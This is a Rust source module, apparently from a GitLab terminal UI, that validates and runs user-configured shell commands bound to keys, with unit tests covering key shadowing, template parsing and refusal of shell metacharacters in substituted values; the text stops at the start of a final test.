//! User-defined shell commands bound to keys through
//! `[[custom_keybindings.<pane>]]`, following gh-dash's keybinding model and
//! template argument names so its examples port unchanged.

use crate::app::Tab;
use crate::config::{Config, CustomKeybinding};
use crate::keybinding::{binding_key_event, keybinding_matches};
use crossterm::event::KeyEvent;

/// Keys the list view handles in code whatever the config says, so a custom
/// binding on one of them never fires. These check the exact modifiers.
const LIST_VIEW_EXACT_KEYS: &[(&str, &str)] = &[
    ("Ctrl+c", "quit"),
    ("Ctrl+s", "switch repository"),
    ("Ctrl+r", "refresh"),
    ("u", "check for updates"),
    ("f", "search"),
];

/// Hard-wired list-view keys matched on the key code alone, so any modified
/// spelling (`Ctrl+q`, `Alt+j`) is taken too.
const LIST_VIEW_CODE_KEYS: &[(&str, &str)] = &[
    ("q", "quit / close details"),
    ("?", "help"),
    ("F1", "help"),
    ("F5", "refresh"),
    (",", "configure columns"),
    ("Esc", "back"),
    ("Backspace", "back"),
    ("Enter", "open details"),
    ("l", "next tab"),
    ("Right", "next tab"),
    ("h", "previous tab"),
    ("Left", "previous tab"),
    ("j", "next row"),
    ("Down", "next row"),
    ("k", "previous row"),
    ("Up", "previous row"),
    ("Home", "first row"),
    ("End", "last row"),
    ("J", "scroll details"),
    ("K", "scroll details"),
];

/// Global bindings that act only inside an overlay, never on the list view.
const OVERLAY_ONLY_GLOBAL_ACTIONS: &[&str] = &["submit_edit"];

/// Characters that end a quoted string or start a command substitution,
/// separator or redirection in a POSIX shell. A template value holding one
/// could run commands the user never wrote, so it is refused.
const SHELL_METACHARACTERS: &[char] =
    &['`', '$', ';', '&', '|', '<', '>', '(', ')', '\\', '"', '\''];

const ENVIRONMENT_PREFIX: &str = "GLAB_TUI_";

/// Keys hard-wired in a tab's handler next to their configurable binding,
/// matched on the key code alone.
fn tab_hardwired_keys(tab: Tab) -> &'static [(&'static str, &'static str)] {
    match tab {
        Tab::Issues => &[("M", "jump to related MRs")],
        Tab::MergeRequests => &[
            ("A", "revoke approval"),
            ("R", "rebase"),
            ("D", "view diff"),
            ("P", "view related pipelines"),
        ],
        Tab::Pipelines => &[
            ("Space", "select pipeline"),
            ("r", "retry"),
            ("W", "open workflow"),
        ],
        Tab::Jobs => &[("S", "start job")],
        _ => &[],
    }
}

/// Hard-wired tab keys that check the exact modifiers.
fn tab_hardwired_exact_keys(tab: Tab) -> &'static [(&'static str, &'static str)] {
    match tab {
        Tab::Pipelines => &[("d", "cancel")],
        _ => &[],
    }
}

/// Whether `event` has the key code `binding` names, whatever its modifiers.
fn same_key_code(binding: &str, event: &KeyEvent) -> bool {
    binding_key_event(binding).is_some_and(|bound| bound.code == event.code)
}

/// The `[keybindings.<table>]` a tab's handler reads, with its bindings.
fn tab_keybindings(config: &Config, tab: Tab) -> (&'static str, Option<toml::Value>) {
    let keybindings = &config.keybindings;
    let (table, bindings) = match tab {
        Tab::Issues => ("issues", toml::Value::try_from(&keybindings.issues)),
        Tab::MergeRequests => ("mrs", toml::Value::try_from(&keybindings.mrs)),
        Tab::Pipelines => ("pipelines", toml::Value::try_from(&keybindings.pipelines)),
        Tab::Jobs => ("jobs", toml::Value::try_from(&keybindings.jobs)),
        Tab::Runners => ("runners", toml::Value::try_from(&keybindings.runners)),
        Tab::Releases => ("releases", toml::Value::try_from(&keybindings.releases)),
        Tab::Todos => ("todos", toml::Value::try_from(&keybindings.todos)),
        Tab::Milestones => ("milestones", toml::Value::try_from(&keybindings.milestones)),
        Tab::Branches => ("branches", toml::Value::try_from(&keybindings.branches)),
        Tab::Environments => (
            "environments",
            toml::Value::try_from(&keybindings.environments),
        ),
        Tab::Terminal => ("terminal", toml::Value::try_from(&keybindings.terminal)),
    };
    (table, bindings.ok())
}

/// Name of the first `field = "binding"` in `bindings` that `event` triggers.
fn matching_field<'a>(
    bindings: &'a toml::Value,
    event: &KeyEvent,
    ignored: &[&str],
) -> Option<&'a str> {
    bindings.as_table()?.iter().find_map(|(field, binding)| {
        let is_match = !ignored.contains(&field.as_str())
            && binding
                .as_str()
                .is_some_and(|binding| keybinding_matches(binding, event));
        is_match.then_some(field.as_str())
    })
}

/// The built-in action that takes `event` on `tab`'s list view before any
/// custom binding is consulted.
fn builtin_action(config: &Config, tab: Tab, event: &KeyEvent) -> Option<String> {
    if let Some(global) = toml::Value::try_from(&config.keybindings.global).ok()
        && let Some(field) = matching_field(&global, event, OVERLAY_ONLY_GLOBAL_ACTIONS)
    {
        return Some(format!("keybindings.global.{field}"));
    }
    let (table, bindings) = tab_keybindings(config, tab);
    if let Some(field) = bindings
        .as_ref()
        .and_then(|bindings| matching_field(bindings, event, &[]))
    {
        return Some(format!("keybindings.{table}.{field}"));
    }
    let exact = LIST_VIEW_EXACT_KEYS
        .iter()
        .chain(tab_hardwired_exact_keys(tab))
        .find(|(binding, _)| keybinding_matches(binding, event));
    let by_code = || {
        LIST_VIEW_CODE_KEYS
            .iter()
            .chain(tab_hardwired_keys(tab))
            .find(|(binding, _)| same_key_code(binding, event))
    };
    exact
        .or_else(by_code)
        .map(|(binding, action)| format!("the built-in \"{binding}\" ({action})"))
}

/// The built-in action that takes `event` in the diff view before any custom
/// binding. The diff view matches plain key codes regardless of modifiers,
/// so `Ctrl+d` is taken by `d` just like `d` itself.
fn diff_view_action(config: &Config, event: &KeyEvent) -> Option<String> {
    use crossterm::event::{KeyCode, KeyModifiers};
    let global = &config.keybindings.global;
    for (field, binding) in [
        ("quit", &global.quit),
        ("help", &global.help),
        ("refresh", &global.refresh),
        ("switch_repo", &global.switch_repo),
    ] {
        if keybinding_matches(binding, event) {
            return Some(format!("keybindings.global.{field}"));
        }
    }
    if let Some((binding, action)) = ["Ctrl+c", "Ctrl+s", "Ctrl+r", "F1", "F5"]
        .into_iter()
        .zip(["quit", "switch repository", "refresh", "help", "refresh"])
        .find(|(binding, _)| keybinding_matches(binding, event))
    {
        return Some(format!("the built-in \"{binding}\" ({action})"));
    }
    let action = match event.code {
        KeyCode::Char('n') if event.modifiers.contains(KeyModifiers::CONTROL) => "next match",
        KeyCode::Char('N') => "previous match",
        KeyCode::Char('q') | KeyCode::Esc => "back",
        KeyCode::Tab => "switch focus",
        KeyCode::Char('h' | 'l' | 'j' | 'k' | 'J' | 'K')
        | KeyCode::Left
        | KeyCode::Right
        | KeyCode::Up
        | KeyCode::Down => "navigate",
        KeyCode::Enter | KeyCode::Char(' ') => "open",
        KeyCode::Char('z' | 'Z') => "fold files",
        KeyCode::Char('m' | 'M') => "reviewed marks",
        KeyCode::Char('[' | ']') => "previous / next hunk",
        KeyCode::Char('d') => "toggle side-by-side",
        KeyCode::Char('/' | 'f') => "search",
        KeyCode::Char('v' | 'V') => "select lines",
        KeyCode::Char('a' | 'c' | 'C' | 'r' | 'e') => "comments",
        KeyCode::Char('T') => "review threads",
        _ => return None,
    };
    Some(format!(
        "the diff view's \"{}\" ({action})",
        key_label(event)
    ))
}

fn key_label(event: &KeyEvent) -> String {
    use crossterm::event::KeyCode;
    match event.code {
        KeyCode::Char(' ') => "Space".to_string(),
        KeyCode::Char(c) => c.to_string(),
        code => format!("{code:?}"),
    }
}

/// The pane a custom keybinding table belongs to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandPane {
    Universal,
    Issues,
    MergeRequests,
    /// The MR/PR diff view, which is not a tab.
    Diff,
}

impl CommandPane {
    /// Pane-specific tables first: on a shared key the more specific binding
    /// wins over a universal one.
    const LOOKUP_ORDER: [CommandPane; 4] = [
        CommandPane::Issues,
        CommandPane::MergeRequests,
        CommandPane::Diff,
        CommandPane::Universal,
    ];

    pub fn config_table(self) -> &'static str {
        match self {
            CommandPane::Universal => "custom_keybindings.universal",
            CommandPane::Issues => "custom_keybindings.issues",
            CommandPane::MergeRequests => "custom_keybindings.mrs",
            CommandPane::Diff => "custom_keybindings.diff",
        }
    }

    /// The `{{.Name}}` arguments a command in this pane can reference.
    pub fn template_arguments(self) -> &'static [&'static str] {
        match self {
            CommandPane::Universal => &["RepoName", "RepoPath"],
            CommandPane::Issues => &[
                "RepoName",
                "RepoPath",
                "IssueNumber",
                "IssueTitle",
                "Author",
            ],
            CommandPane::MergeRequests => &[
                "RepoName",
                "RepoPath",
                "PrNumber",
                "HeadRefName",
                "BaseRefName",
                "Author",
            ],
            CommandPane::Diff => &[
                "RepoName",
                "RepoPath",
                "PrNumber",
                "HeadRefName",
                "BaseRefName",
                "Author",
                "FilePath",
                "LineNumber",
            ],
        }
    }

    /// Whether this pane's commands run from `tab`'s list view.
    pub fn applies_to(self, tab: Tab) -> bool {
        match self {
            CommandPane::Universal => true,
            CommandPane::Issues => tab == Tab::Issues,
            CommandPane::MergeRequests => tab == Tab::MergeRequests,
            CommandPane::Diff => false,
        }
    }

    fn bindings(self, config: &Config) -> &[CustomKeybinding] {
        let tables = &config.custom_keybindings;
        match self {
            CommandPane::Universal => &tables.universal,
            CommandPane::Issues => &tables.issues,
            CommandPane::MergeRequests => &tables.mrs,
            CommandPane::Diff => &tables.diff,
        }
    }
}

/// A validated custom keybinding.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CustomCommand {
    pub pane: CommandPane,
    pub key: String,
    pub name: Option<String>,
    pub command: String,
    pub background: bool,
    /// Tabs where another binding on the same key takes the keypress first.
    pub shadowed_on: Vec<Tab>,
}

impl CustomCommand {
    /// What the help modal and error messages call this command.
    pub fn label(&self) -> &str {
        self.name
            .as_deref()
            .filter(|name| !name.trim().is_empty())
            .unwrap_or(&self.command)
    }

    pub fn is_reachable_on(&self, tab: Tab) -> bool {
        self.pane.applies_to(tab) && !self.shadowed_on.contains(&tab)
    }
}

/// A custom keybinding entry that is ignored or only partly usable.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConfigProblem {
    /// Which entry: its table, position and key.
    pub binding: String,
    pub problem: String,
}

#[derive(Debug, Clone, Default)]
pub struct CustomCommands {
    commands: Vec<CustomCommand>,
}

impl CustomCommands {
    /// Validates every custom keybinding in `config`, keeping the usable ones
    /// and describing every entry that is dropped or shadowed somewhere.
    pub fn load(config: &Config) -> (Self, Vec<ConfigProblem>) {
        let mut commands: Vec<CustomCommand> = Vec::new();
        let mut problems: Vec<ConfigProblem> = config
            .custom_keybindings
            .unsupported_panes
            .keys()
            .map(|pane| ConfigProblem {
                binding: format!("[custom_keybindings.{pane}]"),
                problem: "unsupported pane; use universal, issues, mrs or diff".to_string(),
            })
            .collect();

        for pane in CommandPane::LOOKUP_ORDER {
            for (index, binding) in pane.bindings(config).iter().enumerate() {
                let description = format!(
                    "[{}] entry {} (key \"{}\")",
                    pane.config_table(),
                    index + 1,
                    binding.key
                );
                match validate(config, pane, binding, &commands) {
                    Ok((command, shadow_problem)) => {
                        if let Some(problem) = shadow_problem {
                            problems.push(ConfigProblem {
                                binding: description,
                                problem,
                            });
                        }
                        commands.push(command);
                    }
                    Err(problem) => problems.push(ConfigProblem {
                        binding: description,
                        problem,
                    }),
                }
            }
        }
        (Self { commands }, problems)
    }

    /// The command `event` runs on `tab`, if a custom binding claims it.
    pub fn find(&self, tab: Tab, event: &KeyEvent) -> Option<&CustomCommand> {
        self.commands
            .iter()
            .find(|command| command.is_reachable_on(tab) && keybinding_matches(&command.key, event))
    }

    /// Commands a keypress on `tab` can run, pane-specific ones first.
    pub fn reachable_on(&self, tab: Tab) -> impl Iterator<Item = &CustomCommand> {
        self.commands
            .iter()
            .filter(move |command| command.is_reachable_on(tab))
    }

    /// The diff-view command `event` runs, if a custom binding claims it.
    pub fn find_in_diff(&self, event: &KeyEvent) -> Option<&CustomCommand> {
        self.in_diff()
            .find(|command| keybinding_matches(&command.key, event))
    }

    /// Commands a keypress in the diff view can run.
    pub fn in_diff(&self) -> impl Iterator<Item = &CustomCommand> {
        self.commands
            .iter()
            .filter(|command| command.pane == CommandPane::Diff)
    }

    /// Plain-character keys, which the key-sequence timeout must still
    /// dispatch when they double as the prefix of a two-key binding.
    pub fn character_keys(&self) -> impl Iterator<Item = char> + '_ {
        self.commands.iter().filter_map(|command| {
            let mut chars = command.key.chars();
            match (chars.next(), chars.next()) {
                (Some(c), None) => Some(c),
                _ => None,
            }
        })
    }
}

/// Checks one entry, returning the command plus a note when it is shadowed
/// on some of its tabs, or why it is dropped.
fn validate(
    config: &Config,
    pane: CommandPane,
    binding: &CustomKeybinding,
    accepted: &[CustomCommand],
) -> Result<(CustomCommand, Option<String>), String> {
    if binding.key.trim().is_empty() {
        return Err("missing `key`".to_string());
    }
    if binding.command.trim().is_empty() {
        return Err("missing `command`".to_string());
    }
    let event = binding_key_event(&binding.key)
        .ok_or_else(|| format!("\"{}\" is not a key glab-tui can bind", binding.key))?;
    for argument in template_argument_names(&binding.command)? {
        if !pane.template_arguments().contains(&argument) {
            return Err(format!(
                "{{{{.{argument}}}}} is not available in {}; use {}",
                pane.config_table(),
                pane.template_arguments().join(", ")
            ));
        }
    }
    if accepted
        .iter()
        .any(|command| command.pane == pane && keybinding_matches(&command.key, &event))
    {
        return Err("an earlier entry in the same table already binds this key".to_string());
    }

    let command = CustomCommand {
        pane,
        key: binding.key.clone(),
        name: binding.name.clone(),
        command: binding.command.clone(),
        background: binding.background,
        shadowed_on: Vec::new(),
    };
    if pane == CommandPane::Diff {
        return match diff_view_action(config, &event) {
            Some(action) => Err(format!("never runs: {action} takes the key first")),
            None => Ok((command, None)),
        };
    }

    let tabs: Vec<Tab> = Tab::ALL
        .into_iter()
        .filter(|tab| pane.applies_to(*tab))
        .collect();
    let mut builtin_shadows: Vec<(Tab, String)> = Vec::new();
    let mut shadowed_on: Vec<Tab> = Vec::new();
    for tab in &tabs {
        if let Some(action) = builtin_action(config, *tab, &event) {
            builtin_shadows.push((*tab, action));
            shadowed_on.push(*tab);
        } else if accepted.iter().any(|command| {
            command.is_reachable_on(*tab) && keybinding_matches(&command.key, &event)
        }) {
            shadowed_on.push(*tab);
        }
    }

    let mut actions: Vec<&str> = Vec::new();
    for (_, action) in &builtin_shadows {
        if !actions.contains(&action.as_str()) {
            actions.push(action);
        }
    }
    let shadow_problem = if builtin_shadows.len() == tabs.len() {
        return Err(format!(
            "never runs: {} takes the key first",
            actions.join(", ")
        ));
    } else if builtin_shadows.is_empty() {
        None
    } else {
        let shadowed_tables: Vec<&str> = builtin_shadows
            .iter()
            .map(|(tab, _)| tab_keybindings(config, *tab).0)
            .collect();
        Some(format!(
            "does not run on the {} tab(s): {} takes the key first",
            shadowed_tables.join(", "),
            actions.join(", ")
        ))
    };

    Ok((
        CustomCommand {
            shadowed_on,
            ..command
        },
        shadow_problem,
    ))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Segment<'a> {
    Text(&'a str),
    Argument(&'a str),
}

/// Splits a gh-dash style template into literal text and `{{.Name}}`
/// arguments. Only bare arguments are supported, not Go template pipelines.
fn parse_template(template: &str) -> Result<Vec<Segment<'_>>, String> {
    let mut segments = Vec::new();
    let mut rest = template;
    while let Some(open) = rest.find("{{") {
        if open > 0 {
            segments.push(Segment::Text(&rest[..open]));
        }
        let after_open = &rest[open + 2..];
        let close = after_open
            .find("}}")
            .ok_or_else(|| "a `{{` is never closed with `}}`".to_string())?;
        let expression = after_open[..close].trim();
        let name = expression
            .strip_prefix('.')
            .filter(|name| {
                !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            })
            .ok_or_else(|| {
                format!(
                    "`{{{{{expression}}}}}` is not supported; only `{{{{.Name}}}}` arguments are"
                )
            })?;
        segments.push(Segment::Argument(name));
        rest = &after_open[close + 2..];
    }
    if !rest.is_empty() {
        segments.push(Segment::Text(rest));
    }
    Ok(segments)
}

/// The argument names a template references, in order of appearance.
pub fn template_argument_names(template: &str) -> Result<Vec<&str>, String> {
    Ok(parse_template(template)?
        .into_iter()
        .filter_map(|segment| match segment {
            Segment::Argument(name) => Some(name),
            Segment::Text(_) => None,
        })
        .collect())
}

/// `HeadRefName` → `GLAB_TUI_HEAD_REF_NAME`.
pub fn environment_variable(argument: &str) -> String {
    let mut name = String::from(ENVIRONMENT_PREFIX);
    for (index, c) in argument.chars().enumerate() {
        if c.is_ascii_uppercase() && index > 0 {
            name.push('_');
        }
        name.push(c.to_ascii_uppercase());
    }
    name
}

/// Template argument values for one keypress. An argument can be known to be
/// unavailable, with the reason shown if the command references it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct TemplateValues {
    values: Vec<(&'static str, Result<String, String>)>,
}

impl TemplateValues {
    /// Records `value`; an empty value counts as unavailable.
    pub fn insert(&mut self, argument: &'static str, value: String) {
        let value = if value.is_empty() {
            Err("it is empty for this row".to_string())
        } else {
            Ok(value)
        };
        self.values.push((argument, value));
    }

    pub fn insert_unavailable(&mut self, argument: &'static str, reason: String) {
        self.values.push((argument, Err(reason)));
    }

    fn get(&self, argument: &str) -> Option<&Result<String, String>> {
        self.values
            .iter()
            .find(|(name, _)| *name == argument)
            .map(|(_, value)| value)
    }

    /// `GLAB_TUI_*` variables for every available value. Referencing these
    /// from the shell is safe for any content, unlike template substitution.
    pub fn environment(&self) -> impl Iterator<Item = (String, &str)> {
        self.values.iter().filter_map(|(argument, value)| {
            value
                .as_deref()
                .ok()
                .map(|value| (environment_variable(argument), value))
        })
    }
}

/// Substitutes `values` into `template`. Fails when a referenced argument is
/// unavailable or holds a shell metacharacter.
pub fn render(template: &str, values: &TemplateValues) -> Result<String, String> {
    let mut rendered = String::with_capacity(template.len());
    for segment in parse_template(template)? {
        let argument = match segment {
            Segment::Text(text) => {
                rendered.push_str(text);
                continue;
            }
            Segment::Argument(argument) => argument,
        };
        let value = match values.get(argument) {
            Some(Ok(value)) => value,
            Some(Err(reason)) => {
                return Err(format!("{{{{.{argument}}}}} is unavailable: {reason}"));
            }
            None => return Err(format!("{{{{.{argument}}}}} is unavailable here")),
        };
        if let Some(unsafe_char) = value
            .chars()
            .find(|c| SHELL_METACHARACTERS.contains(c) || c.is_control())
        {
            return Err(format!(
                "{{{{.{argument}}}}} contains the shell metacharacter {unsafe_char:?}; \
                 use \"${}\" in the command instead",
                environment_variable(argument)
            ));
        }
        rendered.push_str(value);
    }
    Ok(rendered)
}

/// `$SHELL -c <command>`, so pipes, quotes and `&&` behave as typed. Falls
/// back to `sh`, or `cmd /C` on Windows where `SHELL` is normally unset.
pub fn shell_process(command: &str) -> std::process::Command {
    let shell = std::env::var("SHELL")
        .ok()
        .filter(|shell| !shell.trim().is_empty());
    let (program, flag) = match shell {
        Some(shell) => (shell, "-c"),
        None if cfg!(windows) => ("cmd".to_string(), "/C"),
        None => ("sh".to_string(), "-c"),
    };
    let mut process = std::process::Command::new(program);
    process.arg(flag).arg(command);
    process
}

#[cfg(test)]
mod tests {
    use super::*;
    use crossterm::event::{KeyCode, KeyModifiers};

    fn config_with(custom_keybindings: &str) -> Config {
        let custom: crate::config::CustomKeybindingConfig =
            toml::from_str(custom_keybindings).expect("custom keybindings parse");
        Config {
            custom_keybindings: custom,
            ..Config::default()
        }
    }

    fn key(c: char) -> KeyEvent {
        binding_key_event(&c.to_string()).expect("plain character key")
    }

    fn values(pairs: &[(&'static str, &str)]) -> TemplateValues {
        let mut values = TemplateValues::default();
        for (argument, value) in pairs {
            values.insert(argument, value.to_string());
        }
        values
    }

    #[test]
    fn gh_dash_example_config_parses_with_its_prs_table_name() {
        let config: Config = toml::from_str(
            r#"
[[custom_keybindings.prs]]
key = "w"
name = "worktree"
command = "tmux new-window -c {{.RepoPath}} 'lazyworktree create --from-pr {{.PrNumber}}'"

[[custom_keybindings.universal]]
key = "L"
command = "cd {{.RepoPath}} && lazygit"
"#,
        )
        .expect("gh-dash style config parses");

        assert_eq!(config.custom_keybindings.mrs.len(), 1);
        assert_eq!(
            config.custom_keybindings.mrs[0].name.as_deref(),
            Some("worktree")
        );
        assert_eq!(
            config.custom_keybindings.universal[0].command,
            "cd {{.RepoPath}} && lazygit"
        );
    }

    /// One malformed entry must not throw away the rest of the config, which
    /// is what a hard deserialization error does in `Config::load`.
    #[test]
    fn entry_without_command_still_parses_and_is_reported() {
        let config: Config = toml::from_str(
            r#"
page_size = 42
[[custom_keybindings.mrs]]
key = "w"
"#,
        )
        .expect("entry missing `command` still parses");
        assert_eq!(config.page_size, 42);

        let (commands, problems) = CustomCommands::load(&config);
        assert_eq!(commands.reachable_on(Tab::MergeRequests).count(), 0);
        assert_eq!(problems.len(), 1);
        assert_eq!(problems[0].problem, "missing `command`");
        assert!(problems[0].binding.contains("custom_keybindings.mrs"));
    }

    #[test]
    fn issue_examples_load_and_run_on_their_tabs() {
        let config = config_with(
            r#"
[[mrs]]
key = "w"
command = "tmux new-window -c {{.RepoPath}} 'lazyworktree create --from-pr {{.PrNumber}}'"
[[mrs]]
key = "C"
name = "review in editor"
command = "nvim -c ':DiffviewOpen {{.BaseRefName}}...{{.HeadRefName}}'"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);
        assert_eq!(problems, vec![]);

        let worktree = commands
            .find(Tab::MergeRequests, &key('w'))
            .expect("w on MRs");
        assert_eq!(
            worktree.label(),
            worktree.command,
            "no name falls back to the command"
        );
        let review = commands
            .find(Tab::MergeRequests, &key('C'))
            .expect("C on MRs");
        assert_eq!(review.label(), "review in editor");
        assert!(
            commands.find(Tab::Issues, &key('w')).is_none(),
            "an mrs binding must not fire on the Issues tab"
        );
    }

    /// The issue's own universal `g` example collides with `jump_to_id`,
    /// which is matched first, so it is reported instead of silently dead.
    #[test]
    fn binding_shadowed_by_a_builtin_everywhere_is_dropped_and_reported() {
        let config = config_with(
            r#"
[[universal]]
key = "g"
command = "cd {{.RepoPath}} && lazygit"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        assert!(commands.find(Tab::Pipelines, &key('g')).is_none());
        assert_eq!(problems.len(), 1);
        assert_eq!(
            problems[0].problem,
            "never runs: keybindings.global.jump_to_id takes the key first"
        );
    }

    #[test]
    fn remapping_the_builtin_frees_its_key_for_a_custom_binding() {
        let mut config = config_with(
            r#"
[[universal]]
key = "g"
command = "lazygit"
"#,
        );
        config.keybindings.global.jump_to_id = "Ctrl+j".to_string();

        let (commands, problems) = CustomCommands::load(&config);
        assert_eq!(problems, vec![]);
        assert!(commands.find(Tab::Pipelines, &key('g')).is_some());
    }

    #[test]
    fn hardwired_list_keys_shadow_custom_bindings() {
        let config = config_with(
            r#"
[[issues]]
key = "j"
command = "true"
[[mrs]]
key = "D"
command = "true"
"#,
        );
        let (_, problems) = CustomCommands::load(&config);

        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
        assert_eq!(
            reasons,
            vec![
                "never runs: the built-in \"j\" (next row) takes the key first",
                "never runs: keybindings.mrs.view_diff takes the key first",
            ]
        );
    }

    /// The list view matches these keys by key code alone, so `Ctrl+q`
    /// quits and `Alt+r` retries a pipeline instead of running the command.
    #[test]
    fn modified_spelling_of_a_code_matched_list_key_is_reported() {
        let config = config_with(
            r#"
[[universal]]
key = "Ctrl+q"
command = "true"
[[universal]]
key = "Alt+k"
command = "true"
[[universal]]
key = "Alt+r"
command = "true"
[[universal]]
key = "Ctrl+t"
command = "true"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
        assert_eq!(
            reasons,
            vec![
                "never runs: the built-in \"q\" (quit / close details) takes the key first",
                "never runs: the built-in \"k\" (previous row) takes the key first",
                "does not run on the pipelines tab(s): the built-in \"r\" (retry) takes the key first",
            ]
        );
        assert!(
            commands
                .find(Tab::Issues, &binding_key_event("Ctrl+t").unwrap())
                .is_some()
        );
    }

    #[test]
    fn universal_binding_shadowed_on_some_tabs_still_runs_on_the_others() {
        let config = config_with(
            r#"
[[universal]]
key = "e"
command = "true"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        assert!(commands.find(Tab::Pipelines, &key('e')).is_some());
        assert!(commands.find(Tab::Issues, &key('e')).is_none());
        assert_eq!(problems.len(), 1);
        assert!(
            problems[0]
                .problem
                .starts_with("does not run on the issues, mrs"),
            "{}",
            problems[0].problem
        );
        assert!(
            problems[0]
                .problem
                .contains("keybindings.issues.edit_entity")
        );
    }

    #[test]
    fn pane_binding_wins_over_a_universal_one_on_the_same_key() {
        let config = config_with(
            r#"
[[universal]]
key = "x"
command = "universal"
[[issues]]
key = "x"
command = "issues"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        assert_eq!(problems, vec![], "a per-pane override is not a mistake");
        assert_eq!(
            commands.find(Tab::Issues, &key('x')).unwrap().command,
            "issues"
        );
        assert_eq!(
            commands.find(Tab::Pipelines, &key('x')).unwrap().command,
            "universal"
        );
        assert_eq!(
            commands.reachable_on(Tab::Issues).count(),
            1,
            "help must not list the shadowed universal binding on Issues"
        );
    }

    #[test]
    fn invalid_entries_are_dropped_with_the_reason() {
        let config = config_with(
            r#"
[[issues]]
key = ""
command = "true"
[[issues]]
key = "gg"
command = "true"
[[issues]]
key = "x"
command = "echo {{.PrNumber}}"
[[issues]]
key = "z"
command = "echo {{ .IssueTitle | upper }}"
[[issues]]
key = "Z"
command = "echo one"
[[issues]]
key = "Z"
command = "echo two"
[[pipelines]]
key = "p"
command = "true"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
        assert_eq!(
            reasons,
            vec![
                "unsupported pane; use universal, issues, mrs or diff",
                "missing `key`",
                "\"gg\" is not a key glab-tui can bind",
                "{{.PrNumber}} is not available in custom_keybindings.issues; \
                 use RepoName, RepoPath, IssueNumber, IssueTitle, Author",
                "`{{.IssueTitle | upper}}` is not supported; only `{{.Name}}` arguments are",
                "an earlier entry in the same table already binds this key",
            ]
        );
        let kept: Vec<&str> = commands
            .reachable_on(Tab::Issues)
            .map(|c| c.command.as_str())
            .collect();
        assert_eq!(kept, vec!["echo one"]);
    }

    #[test]
    fn diff_bindings_run_only_in_the_diff_view_with_file_arguments() {
        let config = config_with(
            r#"
[[diff]]
key = "o"
command = "nvim +{{.LineNumber}} {{.FilePath}}"
[[mrs]]
key = "O"
command = "nvim {{.FilePath}}"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        assert!(commands.find_in_diff(&key('o')).is_some());
        assert!(
            commands.find(Tab::MergeRequests, &key('o')).is_none(),
            "a diff binding must not fire on the list view"
        );
        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
        assert_eq!(
            reasons,
            vec![
                "{{.FilePath}} is not available in custom_keybindings.mrs; \
                 use RepoName, RepoPath, PrNumber, HeadRefName, BaseRefName, Author"
            ]
        );
    }

    /// The diff view matches key codes whatever the modifiers, so a
    /// `Ctrl+d` custom key would toggle side-by-side instead of running.
    #[test]
    fn diff_binding_on_a_diff_view_key_is_dropped_even_with_a_modifier() {
        let config = config_with(
            r#"
[[diff]]
key = "d"
command = "true"
[[diff]]
key = "Ctrl+d"
command = "true"
[[diff]]
key = "Ctrl+o"
command = "true"
"#,
        );
        let (commands, problems) = CustomCommands::load(&config);

        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
        assert_eq!(
            reasons,
            vec![
                "never runs: the diff view's \"d\" (toggle side-by-side) takes the key first",
                "never runs: the diff view's \"d\" (toggle side-by-side) takes the key first",
            ]
        );
        assert_eq!(
            commands
                .in_diff()
                .map(|c| c.key.as_str())
                .collect::<Vec<_>>(),
            vec!["Ctrl+o"]
        );
    }

    #[test]
    fn diff_binding_on_review_threads_key_is_dropped() {
        let config = config_with("[[diff]]\nkey = \"T\"\ncommand = \"true\"\n");
        let (commands, problems) = CustomCommands::load(&config);

        let reasons: Vec<&str> = problems.iter().map(|p| p.problem.as_str()).collect();
        assert_eq!(
            reasons,
            vec!["never runs: the diff view's \"T\" (review threads) takes the key first"]
        );
        assert_eq!(commands.in_diff().count(), 0);
    }

    /// The documented example must load cleanly with the default built-in
    /// keybindings, or the docs teach a config that reports problems.
    #[test]
    fn documented_example_config_loads_without_problems() {
        let config: Config = toml::from_str(include_str!("../examples/custom-keybindings.toml"))
            .expect("example config parses");
        let (commands, problems) = CustomCommands::load(&config);

        assert_eq!(problems, vec![]);
        assert!(commands.in_diff().count() > 0);
    }

    #[test]
    fn character_keys_lists_only_plain_character_bindings() {
        let config = config_with(
            r#"
[[universal]]
key = "x"
command = "true"
[[universal]]
key = "Ctrl+t"
command = "true"
"#,
        );
        let (commands, _) = CustomCommands::load(&config);
        assert_eq!(commands.character_keys().collect::<Vec<_>>(), vec!['x']);
        assert_eq!(
            commands
                .find(
                    Tab::Issues,
                    &KeyEvent::new(KeyCode::Char('t'), KeyModifiers::CONTROL)
                )
                .map(|c| c.key.as_str()),
            Some("Ctrl+t")
        );
    }

    #[test]
    fn render_substitutes_arguments_with_or_without_inner_spaces() {
        let rendered = render(
            "git worktree add ../pr-{{.PrNumber}} {{ .HeadRefName }} # {{.PrNumber}}",
            &values(&[("PrNumber", "42"), ("HeadRefName", "feature/x-1")]),
        );
        assert_eq!(
            rendered.as_deref(),
            Ok("git worktree add ../pr-42 feature/x-1 # 42")
        );
    }

    #[test]
    fn render_names_the_reason_an_argument_is_unavailable() {
        let mut values = values(&[("Author", "")]);
        values.insert_unavailable("RepoPath", "no local checkout of a/b is known".to_string());

        assert_eq!(
            render("cd {{.RepoPath}}", &values),
            Err("{{.RepoPath}} is unavailable: no local checkout of a/b is known".to_string())
        );
        assert_eq!(
            render("echo {{.Author}}", &values),
            Err("{{.Author}} is unavailable: it is empty for this row".to_string())
        );
        assert_eq!(
            render("echo {{.Author", &values),
            Err("a `{{` is never closed with `}}`".to_string())
        );
    }

    /// A title or a fork's branch name is attacker-controlled text; spliced
    /// raw into `sh -c` it could run commands the user never wrote.
    #[test]
